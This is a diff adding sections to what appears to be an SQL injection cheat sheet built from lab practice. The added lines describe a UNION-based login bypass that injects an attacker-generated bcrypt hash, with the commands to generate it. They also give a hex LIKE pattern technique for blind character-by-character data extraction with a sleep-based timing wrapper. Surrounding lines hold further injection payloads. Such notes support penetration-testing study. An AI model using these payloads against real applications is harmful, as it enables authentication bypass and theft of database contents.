@@ -154,6 +154,13 @@ When PHP `filter_var($url, FILTER_VALIDATE_URL)` is used as URL validation:
 ' UNION SELECT table_name,NULL FROM information_schema.tables--
 ```
 
+### Hash Injection Auth Bypass (UNION + bcrypt/argon2)
+When the login query fetches a password hash (single column) and compares via bcrypt/argon2:
+1. `' UNION SELECT 1 -- -` → "Invalid salt" error confirms hash comparison on query result
+2. Generate a hash you control: `python3 -c "import bcrypt; print(bcrypt.hashpw(b'test', bcrypt.gensalt()).decode())"`
+3. Inject it: `' UNION SELECT '$2b$12$YOUR_HASH' -- -` with password=`test`
+Works for any hash algorithm — just match the hash format the app expects.
+
 ### Blind Boolean
 ```sql
 ' AND 1=1--    (True - "Welcome back" appears)
@@ -213,6 +220,17 @@ When PHP `filter_var($url, FILTER_VALIDATE_URL)` is used as URL validation:
 ❌ Testing all columns at once instead of one by one
 ✅ Use NULL for unknown data types
 ✅ Test string columns individually
+
+### LIKE-Based Blind Extraction (when substr/mid fail)
+When `substr()` and `mid()` are non-functional (CMS-specific SQL context, nested queries):
+```sql
+-- Incremental hex LIKE pattern: build value char-by-char
+AND (SELECT column FROM table LIMIT 0,1) LIKE 0x61%    -- starts with 'a'?
+AND (SELECT column FROM table LIMIT 0,1) LIKE 0x6162%  -- starts with 'ab'?
+-- Iterate: for each position, try 0x00-0xff appended to known prefix
+-- Use time-based wrapper: CASE WHEN (col LIKE 0xprefix%) THEN sleep(3) ELSE 0 END
+```
+Key: hex LIKE patterns avoid quote escaping issues and work in most MySQL contexts.
 
 ### Lab 11-15 (Blind SQLi)
 ❌ Not configuring Burp Intruder's Grep Match
